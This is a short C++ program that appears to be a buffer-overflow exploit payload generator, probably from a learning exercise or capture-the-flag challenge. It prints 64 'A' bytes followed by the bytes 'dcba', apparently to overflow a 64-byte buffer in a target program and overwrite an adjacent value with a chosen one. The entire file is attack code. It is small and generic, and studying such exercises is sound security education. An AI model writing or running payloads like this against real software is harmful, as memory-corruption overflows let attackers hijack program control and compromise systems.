#include <iostream>
#include <string>

int main()
{
	// 64 char buffer limit
	// overflowing at 64
	std::string payload;
	char a = 0x61;
	char b = 0x62;
	char c = 0x63;
	char d = 0x64;

	for (int i = 0; i < 64; i++) payload.push_back('\x41');

	printf("%s%c%c%c%c",payload.c_str(),d,c,b,a);
	return 0;
}
